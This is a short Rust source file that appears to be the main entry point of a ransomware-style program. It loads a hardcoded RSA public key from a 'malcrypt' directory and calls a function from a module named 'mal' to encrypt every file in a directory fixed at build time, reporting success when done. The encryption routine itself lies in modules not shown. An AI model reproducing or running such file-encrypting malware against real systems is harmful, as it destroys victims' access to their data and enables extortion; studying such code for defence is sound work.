use mal::encrypt_files_in_directory;
use rsa::{pkcs1::DecodeRsaPublicKey, RsaPublicKey};

mod crypt;
mod mal;
mod resources;

fn main() {
    let directory = env!("PATH_TO_ENCRYPT");

    let hardcoded_pub_key_pem = include_str!("../malcrypt/pubkey.pem");
    let hardcoded_pub_key = RsaPublicKey::from_pkcs1_pem(hardcoded_pub_key_pem)
        .expect("Failed to parse hardcoded public key");

    match encrypt_files_in_directory(&directory, &hardcoded_pub_key) {
        Ok(_) => println!("All files encrypted successfully."),
        Err(e) => eprintln!("An error occurred: {}", e),
    }
}
